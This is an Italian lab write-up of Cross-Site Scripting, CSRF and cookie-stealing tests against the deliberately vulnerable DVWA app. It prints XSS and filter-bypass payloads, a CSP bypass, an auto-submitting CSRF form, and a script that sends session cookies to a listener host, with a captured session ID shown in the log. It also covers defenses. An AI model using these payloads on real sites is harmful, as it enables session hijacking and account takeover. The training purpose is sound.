# Cross-Site Scripting (XSS), CSRF e Session Hijacking - Documentazione DVWA

## Overview
Documentazione completa dei test di vulnerabilità web condotti su Damn Vulnerable Web Application (DVWA) il 25 luglio 2025. Focus su Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF) e Session Hijacking attraverso cookie stealing.

## Metadata del Testing
- **Data**: 25 Luglio 2025, ore 05:57 - 15:39
- **Target**: DVWA su localhost
- **Ambiente**: Kali Linux con Python HTTP server
- **Vulnerabilità testate**: Stored XSS, Reflected XSS, DOM-based XSS
- **Tools utilizzati**: Browser, Python server, curl

---

## Cross-Site Scripting (XSS) - Teoria e Testing

### Definizione e Funzionamento

Il **Cross-Site Scripting (XSS)** è una vulnerabilità che consente a un attaccante di iniettare codice JavaScript maligno in una pagina web. Quando il browser della vittima carica la pagina compromessa, esegue lo script dell'attaccante come fosse parte del sito legittimo, permettendo:

- **Furto di cookie e sessioni**
- **Raccolta di dati sensibili** 
- **Lancio di exploit più complessi**
- **Defacement delle pagine**
- **Phishing e social engineering**

### Tipologie di XSS Testate

#### 1. Stored XSS (Persistente)

**Caratteristiche**:
- Il payload viene salvato sul server o database
- Mostrato ad altri utenti che visitano la pagina
- **Persistente**: rimane attivo fino alla rimozione manuale

**Payload Testato**:
```javascript
<script>alert('STORED')</script>
```

**Processo di Testing**:
1. Inserimento del payload nel campo "Name" del form DVWA
2. Salvataggio nel database
3. **Risultato**: Ogni utente che visita la pagina vede l'alert con "STORED"

**Impatto**: Ogni visitatore della pagina è vittima del payload automaticamente.

#### 2. Reflected XSS (Non-Persistente)

**Caratteristiche**:
- Il payload è riflesso direttamente dal server nella risposta HTTP
- **Transitorio**: si attiva solo se la vittima interagisce con un link modificato
- Non viene salvato permanentemente

**Payload Testato**:
```javascript
<img src=x onerror=alert('REFLECTED')>
```

**Processo di Testing**:
1. Inserimento del payload nel form di input
2. Submit del form
3. **Risultato**: Alert immediato con scritto "REFLECTED"

**Meccanismo**: Il server riflette l'input dell'utente nella pagina senza sanitizzazione.

#### 3. DOM-based XSS

**Caratteristiche**:
- Il payload è gestito completamente lato client tramite JavaScript vulnerabile
- Non coinvolge la risposta del server
- Sfrutta vulnerabilità nel Document Object Model

**Esempio di codice vulnerabile**:
```javascript
document.write(location.hash)
```

**URL di Test**:
```url
http://localhost/DVWA/vulnerabilities/xss_d/#<script>alert('DOM')</script>
```

**Processo di Testing**:
1. Modifica dell'URL aggiungendo il payload dopo il simbolo #
2. Caricamento della pagina
3. **Risultato**: Alert lato client con scritto "DOM"

**Meccanismo**: JavaScript legge `location.hash` e lo scrive direttamente nel DOM senza validazione.

---

## Tecniche di Bypass dei Filtri

### 1. HTML Entity Encoding

**Obiettivo**: Bypassare filtri che bloccano caratteri "<" e ">"

**Meccanismo**: Utilizzare entità HTML che vengono decodificate dal browser durante il rendering.

**Encoding Testati**:
```html
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
```

**Mappatura caratteri**:
- `&lt;` = `<`
- `&gt;` = `>`
- `&#60;` = `<` (decimale)
- `&#62;` = `>` (decimale)

**URL di Bypass Testato**:
```url
http://192.168.1.100/DVWA/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert(1)%3C/script%3E
```

**Risultato**: Il payload con encoding viene eseguito e stampa "1" nell'alert DOM.

### 2. Unicode / Hex Encoding

**Obiettivo**: Nascondere parole pericolose come "alert" o "script" usando unicode escaping.

**Meccanismo**: Alcune funzioni JavaScript come `eval()` interpretano codici Unicode.

**Esempio Testato**:
```javascript
<script>eval('\u0061lert(1)')</script>
```

**Spiegazione**: `\u0061` = 'a', quindi `\u0061lert` = `alert`

**Uso**: Utile quando la blacklist blocca "alert" ma non rileva le versioni codificate.

### 3. Case Obfuscation

**Obiettivo**: Bypassare filtri case-sensitive che cercano `<script>` in minuscolo.

**Meccanismo**: HTML è case-insensitive per i tag, quindi `<ScRiPt>` è interpretato ugualmente.

**Esempi**:
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<Script>alert(1)</Script>
```

**Uso**: Efficace se il filtro cerca solo `<script>` e non `<ScRiPt>`.

### 4. Event Handler Injection

**Obiettivo**: Evitare l'uso di `<script>` e sfruttare altri elementi con attributi eseguibili.

**Event Handler Disponibili**:
- `onerror` - Si attiva quando un elemento fallisce nel caricamento
- `onload` - Si attiva quando un elemento viene caricato

**Payload Pratici Testati su DVWA Stored XSS**:
```html
</p><script>alert("XSS OK")</script>
<img src=x onerror=alert("IMG XSS")>
<svg onload=alert("SVG XSS")>
<iframe src="javascript:alert('iframe')"></iframe>
<details open ontoggle=alert('toggle')>
```

---

## Content Security Policy (CSP) e Bypass

### CSP Fundamentals

**Content Security Policy** è una protezione lato browser progettata per prevenire attacchi XSS e code injection controllando quali contenuti (JavaScript, CSS, immagini) possono essere caricati o eseguiti su una pagina web.

**Meccanismo**: HTTP header-based policy definita dal server che dice al browser "esegui solo questi script da queste fonti, blocca il resto".

**Obiettivi del CSP**:
1. **Limitare scripting inline**: Blocca `<script>alert("xss")</script>`
2. **Controllare fonti esterne**: Solo script da domini autorizzati  
3. **Bloccare eval()**: Impedisce l'uso di `eval()` o JavaScript URI

### URI (Uniform Resource Identifier) - Contesto di Sicurezza

**URI Categories**:

**URL (Uniform Resource Locator)**:
```
https://example.com/index.html
```
Localizza una pagina web specifica.

**URN (Uniform Resource Name)**:
```
urn:isbn:978-3-16-148410-0
```
Nome univoco persistente (esempio: codice ISBN).

**Esempi di URI**:
- `https://example.com/index.html` → URL: localizza una pagina web
- `mailto:user@example.com` → URI schema per e-mail  
- `data:text/html,<script>alert(1)</script>` → URI inline, usato spesso in XSS

### Implementazione CSP su DVWA

**Configurazione Apache testata**:
```bash
sudo nano /etc/apache2/sites-enabled/000-default.conf

Header set Content-Security-Policy "script-src 'self'"

sudo systemctl restart apache2
```

**Policy Analizzata**: `script-src 'self'` permette solo script dallo stesso dominio.

### Bypass CSP Riuscito

**Payload di Bypass Testato**:
```javascript
<img src=x onerror=eval('alert(1)')>
```

**Meccanismo del Bypass**:
1. L'event handler `onerror` si attiva quando l'immagine fallisce il caricamento
2. `eval('alert(1)')` viene eseguito all'interno dell'event handler
3. Il CSP potrebbe non bloccare `eval()` in questo contesto specifico
4. Il payload aggira la restrizione `script-src 'self'`

---

## Session Hijacking tramite Cookie Stealing

### Teoria del Cookie Stealing

Il **cookie stealing** tramite XSS rappresenta uno degli scenari più pericolosi, permettendo di rubare cookie di sessione di qualsiasi utente che visiti la pagina compromessa.

**Meccanismo**:
1. Inserimento di payload XSS (stored o reflected)
2. L'utente o admin visualizza la pagina infetta
3. Il browser esegue lo script e invia automaticamente il cookie al server dell'attaccante
4. L'attaccante cattura i cookie e li può usare per impersonare l'utente (se non protetti da flag "httpOnly")

### Payload di Cookie Stealing

**JavaScript Payload Testato**:
```javascript
<script>
	new Image().src="http://192.168.1.50:8000/?c=" + document.cookie;
</script>
```

**Analisi Tecnica del Payload**:
- `new Image()`: Crea dinamicamente un oggetto Image
- `.src=`: Effettua una richiesta GET al server dell'attaccante
- `"http://192.168.1.50:8000/"`: URL del server in ascolto
- `"?c=" + document.cookie`: Appende il valore dei cookie alla query string
- **Stealth**: Non apre popup, non stampa nulla, è invisibile all'utente

### Setup del Server di Raccolta

**Python HTTP Server Base**:
```python
python3 -m http.server 8000
```

**Processo Operativo**:
1. Avvio del listener sul terminale attaccante
2. Il server si mette in ascolto per richieste in arrivo
3. Quando il payload si attiva, i cookie vengono ricevuti in console

### Risultato del Test Pratico

**Output del Server Registrato**:
```bash
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.100 - - [25/Jul/2025 15:00:57] "GET /?c=security=low;%20PHPSESSID=7clamc268ghvt4nsgie41mvpol HTTP/1.1" 200 -
```

**Analisi dei Cookie Rubati**:
- **security=low**: Livello di sicurezza DVWA
- **PHPSESSID=7clamc268ghvt4nsgie41mvpol**: Identificatore di sessione PHP
- **URL encoding**: Gli spazi sono convertiti in `%20`
- **IP source**: `192.168.1.100` (server DVWA target)

**Problema Identificato**: Il server non salva automaticamente i cookie. 

**Soluzione**: Ampliare il server Python con reindirizzamento ai log:
```bash
python3 -m http.server 8000 >> logs.txt 2>&1
```

Questo comando salva tutti i log del server in un file per consultazione successiva.

---

## Cross-Site Request Forgery (CSRF)

### CSRF Fundamentals

**Cross-Site Request Forgery** ha l'obiettivo di forzare un browser autenticato a inviare una richiesta non voluta (POST, GET, PUT) a un'applicazione target in cui l'utente ha una sessione attiva.

**Meccanismo di Sfruttamento**:
- L'attaccante sfrutta la sessione attiva dell'utente
- I cookie sono automaticamente inviati con ogni richiesta al dominio target
- Il server elabora la richiesta come se fosse legittima

### Esempio di Applicazione Vulnerabile

**Cambio Password Vulnerability**:
```http
POST /change_password.php
Content-Type: application/x-www-form-urlencoded

new_password=hacked&confirm_password=hacked
```

**Contesto**: L'utente è loggato e ha un cookie `PHPSESSID=abc123`.

### Payload CSRF

**Form HTML Malevolo**:
```html
<form action="http://victim.com/change_password.php" method="POST">
  <input type="hidden" name="new_password" value="hacked">
  <input type="hidden" name="confirm_password" value="hacked">
  <input type="submit">
</form>

<script>
document.forms[0].submit(); // invio automatico
</script>
```

**Meccanismo di Attacco**:
1. Quando l'utente visita questo payload, il browser invia automaticamente i cookie
2. Il server riceve la richiesta con cookie validi
3. Il server esegue il cambio password come se fosse una richiesta legittima

### Protezioni Comuni Contro CSRF

#### 1. CSRF Token (Anti-CSRF Token)

**Caratteristiche**:
- Valore random incluso nel form
- Validato server-side
- Non accessibile a siti terzi

#### 2. SameSite Cookie Attribute

**Tabella Comportamenti SameSite**:

| SameSite | Significato |
|----------|-------------|
| Strict | Cookie inviato solo in navigazione first-party |
| Lax | Cookie inviato solo in GET di navigazione normale |
| None | Cookie inviato in tutti i contesti, ma richiede Secure |

**Vulnerabilità Legacy**: `SameSite=None` è spesso il punto debole nelle applicazioni legacy.

#### 3. Double Submit Cookies

**Meccanismo**:
- Il token è inserito sia in un cookie che nel body della richiesta
- Il server confronta i due valori
- Utilizzato quando non è disponibile sessione lato server

---

## Analisi degli Impatti di Sicurezza

### Impatti del Cross-Site Scripting

**Impatti Immediati**:
- **Session Hijacking**: Furto completo dell'identità utente
- **Data Theft**: Accesso a informazioni sensibili nel DOM
- **Defacement**: Modifica dell'aspetto delle pagine
- **Phishing**: Creazione di form fasulli per credential harvesting

**Impatti a Lungo Termine**:
- **Worm-like Propagation**: Auto-diffusione attraverso social features
- **Administrative Compromise**: Targeting specifico di account admin
- **Reputation Damage**: Perdita di fiducia degli utenti
- **Compliance Violations**: Violazioni GDPR per data breach

### Impatti del CSRF

**Operazioni Compromesse**:
- **Account Takeover**: Cambio password o email
- **Financial Transactions**: Trasferimenti non autorizzati
- **Data Modification**: Modifica di informazioni sensibili
- **Administrative Actions**: Operazioni di gestione sistema

### Impatti del Session Hijacking

**Conseguenze della Compromissione**:
- **Complete Impersonation**: Accesso totale all'account vittima
- **Privilege Escalation**: Se la vittima ha privilegi elevati
- **Data Access**: Accesso a tutti i dati disponibili alla sessione
- **Malicious Actions**: Azioni compiute per conto della vittima

---

## Lesson Learned e Considerazioni Finali

### Scoperte Principali

**Vulnerabilità Interconnesse**:
- XSS → Cookie Stealing → Session Hijacking rappresenta una chain di attacco devastante
- CSRF spesso sottovalutato ma critico per state-changing operations
- CSP efficace ma richiede configurazione attenta per evitare bypass

**Tecniche di Bypass Efficaci**:
- HTML entity encoding aggira filtri basilari
- Event handler injection evita blocchi su tag `<script>`
- Case obfuscation sfrutta case-insensitivity HTML
- Unicode encoding nasconde payload da detection automatica

### Difese Più Efficaci Identificate

**Per XSS**:
- Content Security Policy con configurazione rigorosa
- Output encoding context-aware
- Input validation con whitelist approach
- HttpOnly flag sui cookie di sessione

**Per CSRF**:
- CSRF token con validazione server-side
- SameSite=Strict sui cookie di autenticazione
- Double submit cookie pattern
- Validazione referer header

**Per Session Security**:
- Session regeneration frequente
- Secure flag su tutti i cookie
- Timeout di sessione appropriati
- Monitoring delle anomalie di login

### Raccomandazioni Operative

**Immediate Actions**:
1. Audit di tutte le forme per presenza di CSRF token
2. Implementazione CSP header su tutte le pagine
3. Review della configurazione cookie di sessione
4. Testing di tutti gli input per XSS vulnerabilities

**Long-term Security Strategy**:
1. Security training per development team
2. Automated security testing nel CI/CD pipeline
3. Regular penetration testing con focus su client-side attacks
4. Incident response plan per web application breaches

---

## Disclaimer e Note Etiche

### Contesto di Testing

⚠️ **IMPORTANTE**: Tutti i test documentati sono stati condotti esclusivamente su:
- **DVWA (Damn Vulnerable Web Application)**: Applicazione progettata per il testing
- **Ambiente controllato**: Rete isolata senza connessione internet
- **Sistemi di proprietà**: Nessun test su sistemi non autorizzati

### Scopo Educativo

Questa documentazione è destinata esclusivamente a:
- **Formazione di security professionals**
- **Miglioramento delle difese applicative**
- **Awareness sulla criticità delle vulnerabilità web**
- **Sviluppo di controlli di sicurezza più efficaci**

### Responsabilità Legale

L'utilizzo di queste tecniche su sistemi non autorizzati costituisce attività illegale in molte giurisdizioni. L'autore non si assume responsabilità per usi impropri di queste informazioni.

---

## Metadata del Documento

- **Autore**: Alessandro (Security Researcher)
- **Data**: 25 Luglio 2025
- **Versione**: 1.0
- **Classificazione**: Technical Documentation - Educational Use
- **Target Audience**: Cybersecurity professionals e studenti

*Documentazione creata come parte del percorso "90 giorni da Ethical Hacker a Senior Security Professional" - Una risorsa per la community italiana di cybersecurity.*
